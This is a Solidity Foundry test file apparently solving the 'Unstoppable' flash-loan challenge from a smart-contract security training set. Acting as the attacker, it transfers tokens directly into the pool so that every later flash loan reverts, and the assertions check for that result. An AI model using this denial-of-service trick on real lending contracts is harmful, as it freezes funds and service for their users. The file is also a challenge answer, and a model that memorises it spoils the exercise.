// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/UnstoppableFixture.sol";

contract UnstoppableTest is UnstoppableFixture {
    function setUp() public override {
        super.setUp();
    }

    function test_flashPool() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        token.transfer(address(pool), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Stop acting like the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Expect the FlashPoolLender to revert on all flash loans
        vm.expectRevert();
        vm.prank(user);
        receiver.executeFlashLoan(10);
    }
}
